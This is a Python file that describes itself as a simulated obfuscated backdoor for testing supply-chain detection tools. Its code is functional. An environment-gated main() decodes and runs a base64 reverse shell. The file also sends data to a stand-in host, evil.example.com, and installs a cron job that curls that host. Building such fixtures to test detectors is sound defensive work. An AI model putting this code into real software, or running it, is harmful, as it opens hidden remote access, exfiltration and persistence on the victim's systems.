"""
backdoor_sim.py — Simulated obfuscated backdoor for CPG analysis testing.

This file contains intentionally malicious patterns (base64-encoded command
execution, dynamic imports, obfuscated strings) for testing supply-chain
detection tools. DO NOT execute this file outside a sandboxed analysis
environment.

Author: Security Research Test Suite
"""

import os
import sys
import base64
import subprocess
from typing import Optional


def _decode_payload(encoded_cmd: str) -> str:
    """Decode a base64-encoded command string.

    Args:
        encoded_cmd: Base64-encoded command.

    Returns:
        Decoded command string.

    Raises:
        ValueError: If the input is not valid base64.
    """
    try:
        return base64.b64decode(encoded_cmd).decode("utf-8")
    except Exception as exc:
        raise ValueError(f"Failed to decode payload: {exc}") from exc


def _hidden_check() -> bool:
    """Environment check — returns True if running in a target environment.

    Returns:
        Boolean indicating whether the environment matches expected criteria.
    """
    env_flag: Optional[str] = os.environ.get("DEPLOYMENT_ENV", "")
    return env_flag in ("production", "staging")


def _exfiltrate(data: str, endpoint: str = "https://evil.example.com/collect") -> None:
    """Simulated data exfiltration over HTTP.

    Args:
        data: The data payload to exfiltrate.
        endpoint: The remote endpoint URL.
    """
    import urllib.request
    payload: bytes = data.encode("utf-8")
    req = urllib.request.Request(endpoint, data=payload,
                                  headers={"Content-Type": "text/plain"})
    try:
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass  # Silently fail to avoid detection


def _persistence() -> None:
    """Establish persistence via cron job registration."""
    cron_entry: str = "0 * * * * /usr/bin/curl -s https://evil.example.com/ping"
    encoded: str = base64.b64encode(cron_entry.encode()).decode()
    decoded_cmd: str = _decode_payload(encoded)
    subprocess.run(["bash", "-c", f'(crontab -l; echo "{decoded_cmd}") | crontab -'],
                   capture_output=True, shell=True)


def benign_helper(name: str) -> str:
    """A legitimate-looking helper function.

    Args:
        name: A username to greet.

    Returns:
        A greeting string.
    """
    return f"Hello, {name}!"


def main() -> None:
    """Main entry point — conditionally triggers backdoor behavior."""
    if _hidden_check():
        # Obfuscated reverse shell payload
        payload_encoded: str = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE="
        decoded: str = _decode_payload(payload_encoded)
        os.system(decoded)

        _exfiltrate("system_compromised")
        _persistence()

    result: str = benign_helper("User")
    print(result)


if __name__ == "__main__":
    main()
